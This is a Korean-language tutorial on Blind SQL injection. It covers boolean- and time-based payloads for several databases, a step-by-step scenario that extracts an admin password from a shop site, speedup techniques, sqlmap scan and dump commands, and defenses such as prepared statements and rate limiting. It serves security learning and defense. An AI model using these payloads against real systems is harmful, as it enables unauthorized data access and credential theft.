Blind SQL Injection 개요

Blind SQL Injection은 데이터베이스 쿼리 결과나 에러 메시지가 웹 페이지에 직접 표시되지 않을 때 사용하는 간접적인 SQL Injection 기법입니다.

개념 (Concept)​

Blind SQLi란?​

**Blind SQL Injection (Inferential SQLi)**은 공격자가 데이터베이스 응답을 직접 볼 수 없지만, 애플리케이션의 간접적인 반응을 통해 정보를 추론하는 기법입니다.

일반 SQLi vs Blind SQLi:

일반 SQLiBlind SQLi
에러 메시지 표시됨에러 메시지 숨김
쿼리 결과 직접 확인 가능간접적인 응답만 확인 가능
빠른 데이터 추출느린 데이터 추출 (바이트 단위)

Blind SQLi가 필요한 상황:

  • 에러 메시지가 숨겨진 경우 (display_errors=Off)
  • 쿼리 결과가 웹 페이지에 출력되지 않는 경우
  • 일반적인 In-band SQLi가 불가능한 경우

Blind SQLi 유형​

1. Boolean-based Blind SQLi (논리 기반)​

애플리케이션이 참(True)/거짓(False) 조건에 따라 다르게 응답하는 것을 이용

특징:

  • 페이지 내용이 쿼리 결과(참/거짓)에 따라 변경됨
  • 한 글자씩 비교하여 데이터 추출
  • 시간은 걸리지만 정확함

예시:

-- 참일 때: 정상 페이지
' AND 1=1--

-- 거짓일 때: 빈 페이지 또는 에러
' AND 1=2--

데이터 추출 원리:

-- 첫 글자가 'a'인지 확인
' AND SUBSTRING(database(), 1, 1) = 'a'--   (거짓 → 다른 응답)
' AND SUBSTRING(database(), 1, 1) = 't'--   (참 → 정상 응답)

2. Time-based Blind SQLi (시간 기반)​

데이터베이스에 시간 지연을 발생시켜 쿼리 결과를 추론

특징:

  • 참/거짓 응답 차이가 없어도 사용 가능
  • 시간 지연으로 조건 참/거짓 판단
  • 가장 범용적이지만 가장 느림

예시:

-- MySQL
' AND IF(1=1, SLEEP(5), 0)--   (5초 지연 → 참)
' AND IF(1=2, SLEEP(5), 0)--   (즉시 응답 → 거짓)

-- MSSQL
'; IF (1=1) WAITFOR DELAY '00:00:05'--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

Blind SQLi 탐지 방법​

수동 탐지​

1. Boolean-based 탐지​

논리 연산자 테스트:

?id=1' AND '1'='1   -- 정상 페이지
?id=1' AND '1'='2   -- 다른 응답 (빈 페이지 등)

응답 비교:

  • 정상 쿼리와 거짓 쿼리의 응답 차이 확인
  • 페이지 길이, 특정 텍스트 유무, HTTP 상태 코드 등

실전 예시:

http://example.com/user?id=1' AND 1=1--     → "Welcome, Admin" 출력
http://example.com/user?id=1' AND 1=2--     → 빈 페이지

2. Time-based 탐지​

시간 지연 테스트:

-- MySQL
?id=1' AND SLEEP(5)--

-- MSSQL
?id=1'; WAITFOR DELAY '00:00:05'--

-- PostgreSQL
?id=1'; SELECT pg_sleep(5)--

-- Oracle
?id=1' AND DBMS_LOCK.SLEEP(5)--

응답 시간 측정:

  • 정상 응답: 즉시 (< 1초)
  • 지연 주입 성공: 5초 이상

자동화 도구​

SQLMap - Blind SQLi 탐지​

Boolean-based 스캔:

sqlmap -u "http://example.com/page?id=1" --technique=B --batch

출력 예시:

[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable

Time-based 스캔:

sqlmap -u "http://example.com/page?id=1" --technique=T --batch

출력 예시:

[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable

Blind SQLi 전용 스캔:

sqlmap -u "http://example.com/page?id=1" --technique=BT --level=3 --risk=2

옵션 설명:

  • --technique=BT: Boolean + Time-based만 사용
  • --level=3: 더 많은 페이로드 테스트
  • --risk=2: 위험도 높은 페이로드 포함

Blind SQLi 공격 흐름​

단계 1: 취약점 확인​

Boolean-based 확인:

http://example.com/product?id=1' AND 1=1--   ✓ 정상
http://example.com/product?id=1' AND 1=2--   ✗ 빈 페이지

→ Boolean-based Blind SQLi 취약점 확인

단계 2: 데이터베이스 이름 길이 확인​

' AND LENGTH(database()) = 1--   거짓
' AND LENGTH(database()) = 2--   거짓
' AND LENGTH(database()) = 5--   거짓
' AND LENGTH(database()) = 6--   참!

→ DB 이름은 6글자

단계 3: 데이터베이스 이름 추출 (문자 단위)​

1번째 글자:

' AND SUBSTRING(database(), 1, 1) = 'a'--   거짓
' AND SUBSTRING(database(), 1, 1) = 'b'--   거짓
...
' AND SUBSTRING(database(), 1, 1) = 'w'--   참!

2번째 글자:

' AND SUBSTRING(database(), 2, 1) = 'a'--   참!

반복하여 전체 이름 추출:

w e b a p p

→ DB 이름: webapp

단계 4: 테이블/컬럼/데이터 추출​

동일한 방식으로:

  1. 테이블 이름 길이 확인
  2. 테이블 이름 한 글자씩 추출
  3. 컬럼 이름 추출
  4. 실제 데이터 추출

Boolean-based vs Time-based 비교​

특성Boolean-basedTime-based
속도빠름 (네트워크 지연만)느림 (의도적 지연)
정확도높음높음
필요 조건응답 차이 존재조건 불필요 (항상 가능)
네트워크 부하낮음낮음
탐지 난이도쉬움 (로그 분석)어려움
사용 시나리오응답 차이 있을 때응답 차이 없을 때

선택 기준:

  • Boolean-based 우선 사용 (빠름)
  • 응답 차이가 없으면 Time-based 사용

실전 공격 시나리오​

시나리오: 로그인 우회 + 데이터 추출​

취약한 URL:

http://shop.example.com/product.php?id=5

1. Boolean-based 취약점 확인:

http://shop.example.com/product.php?id=5' AND 1=1--

→ 정상 페이지 표시

http://shop.example.com/product.php?id=5' AND 1=2--

→ 상품 정보 사라짐 (빈 페이지)

2. 관리자 존재 여부 확인:

http://shop.example.com/product.php?id=5' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--

→ 정상 페이지 (관리자 계정 존재)

3. 관리자 비밀번호 길이 확인:

http://shop.example.com/product.php?id=5' AND LENGTH((SELECT password FROM users WHERE username='admin'))=32--

→ 정상 페이지 (비밀번호는 32글자)

4. 비밀번호 첫 글자 추출:

http://shop.example.com/product.php?id=5' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='5'--

→ 정상 페이지 (첫 글자는 '5')

5. 나머지 글자 반복 추출...

최적화 기법​

1. 이진 탐색 (Binary Search)​

글자를 하나씩 비교하는 대신 ASCII 값 범위를 절반씩 좁혀가며 탐색

일반적인 방법 (최대 26번 시도):

' AND SUBSTRING(database(), 1, 1) = 'a'--
' AND SUBSTRING(database(), 1, 1) = 'b'--
...
' AND SUBSTRING(database(), 1, 1) = 'z'--

이진 탐색 (최대 7번 시도):

-- ASCII 값이 109보다 큰가? (a~z 범위 중간값)
' AND ASCII(SUBSTRING(database(), 1, 1)) > 109--   (참)

-- ASCII 값이 122보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 122--   (거짓)

-- ASCII 값이 116보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 116--   (참)
...

시간 절약:

  • 26글자 알파벳: 26번 → 5번
  • 전체 ASCII (0~127): 128번 → 7번

2. Bit-by-Bit 추출​

각 문자의 비트를 개별적으로 추출

-- 첫 번째 비트 확인
' AND (ASCII(SUBSTRING(database(), 1, 1)) & 1) = 1--

-- 두 번째 비트 확인
' AND (ASCII(SUBSTRING(database(), 1, 1)) & 2) = 2--

3. 병렬 요청​

여러 글자를 동시에 요청하여 속도 향상 (자동화 도구에서 주로 사용)

방어 기법​

1. Prepared Statements​

PHP:

$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$_GET['id']]);

2. 응답 표준화​

모든 에러 상황에서 동일한 응답 반환:

if (!$result || $result->num_rows === 0) {
    // 동일한 에러 페이지
    include('error.php');
    exit();
}

3. 응답 시간 일정화​

Time-based 공격 방지를 위해 일정한 응답 시간 유지:

$start_time = microtime(true);

// 쿼리 실행
$result = $conn->query($query);

// 최소 응답 시간 유지
$elapsed = microtime(true) - $start_time;
if ($elapsed < 0.5) {
    usleep((0.5 - $elapsed) * 1000000);
}

4. Rate Limiting​

반복적인 요청 차단:

// 1분에 최대 60개 요청
if ($request_count > 60) {
    http_response_code(429);
    die("Too many requests");
}

트러블슈팅 체크리스트​

Boolean-based가 작동하지 않을 때​

  • 응답 차이를 명확히 식별 (페이지 길이, 특정 문자열 등)
  • 다른 논리 조건 시도 (OR 대신 AND)
  • 주석 처리 확인 (-- 뒤 공백 필요)
  • Time-based로 전환 고려

Time-based가 작동하지 않을 때​

  • DBMS 종류 확인 (MySQL, MSSQL, PostgreSQL 등)
  • 충분한 지연 시간 설정 (5~10초)
  • 네트워크 지연과 구분
  • 다른 시간 지연 함수 시도

데이터 추출이 너무 느릴 때​

  • 이진 탐색 사용
  • SQLMap 자동화 도구 사용
  • Boolean-based 우선 사용 (Time-based보다 빠름)
  • 병렬 요청 시도 (스크립트 작성)

빠른 명령어 참조 (Quick Reference)​

Boolean-based 페이로드​

# 기본 테스트
' AND 1=1--   (참)
' AND 1=2--   (거짓)

# 데이터 추출
' AND LENGTH(database())=6--
' AND SUBSTRING(database(), 1, 1)='w'--
' AND ASCII(SUBSTRING(database(), 1, 1))>109--

# 테이블 존재 확인
' AND (SELECT COUNT(*) FROM users)>0--

Time-based 페이로드​

# MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--

# MSSQL
'; WAITFOR DELAY '00:00:05'--
'; IF (1=1) WAITFOR DELAY '00:00:05'--

# PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

# Oracle
' AND DBMS_LOCK.SLEEP(5)--

SQLMap 명령어​

# Boolean-based 스캔
sqlmap -u "URL" --technique=B --batch

# Time-based 스캔
sqlmap -u "URL" --technique=T --batch

# Blind SQLi 전용 (둘 다)
sqlmap -u "URL" --technique=BT --level=3 --risk=2

# 데이터베이스 추출
sqlmap -u "URL" --technique=BT --current-db

# 테이블 덤프
sqlmap -u "URL" --technique=BT -D dbname -T users --dump
